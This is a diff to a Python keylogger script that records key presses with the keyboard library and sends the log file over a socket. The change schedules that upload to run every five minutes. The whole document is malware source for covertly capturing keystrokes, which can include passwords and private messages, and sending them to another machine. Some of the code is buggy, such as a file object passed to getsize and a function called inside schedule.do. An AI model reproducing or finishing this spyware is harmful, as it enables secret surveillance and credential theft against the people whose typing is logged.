@@ -1,6 +1,8 @@
 import keyboard
 import socket
 import os
+import schedule
+import time
 
 def keyPress(event):
 
@@ -15,16 +17,15 @@ def sendMessage(s, log):
 
     file = open(log, 'rb')
     #For getting file size, may not be used.
-    file_size = os.path.getsize(file)
+    #file_size = os.path.getsize(file)
 
     s.send("recieved_log".encode())
     #More file size stuff
-    s.send(str(file_size).encode())
+    #s.send(str(file_size).encode())
 
     data = file.read()
     s.sendall(data)
     s.send(b"<END>")
-    
 
 
 def main():
@@ -38,7 +39,9 @@ def main():
     keyboard.wait()
 
     #Send log file every day?  Needs function for that
-    sendMessage(s, log)
+    schedule.every(5).minutes.do(sendMessage(s, log))
+    log.close()
+    s.close()
 
 if __name__ == "__main__":
     main()
